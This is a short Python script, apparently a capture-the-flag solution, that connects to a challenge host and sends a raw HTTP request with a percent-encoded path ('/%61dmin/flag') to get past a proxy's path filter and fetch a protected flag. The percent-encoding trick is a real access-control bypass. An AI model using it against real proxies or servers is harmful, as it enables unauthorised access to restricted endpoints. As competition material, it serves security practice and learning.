import socket

host = 'rusty-proxy.chals.bitskrieg.in'
port = 25001

s = socket.socket()
s.connect((host, port))

# Send URL-encoded path
req = "GET /%61dmin/flag HTTP/1.1\r\nHost: rusty-proxy\r\nConnection: close\r\n\r\n"
s.sendall(req.encode())

resp = b""
while True:
    chunk = s.recv(4096)
    if not chunk: break
    resp += chunk

print(resp.decode())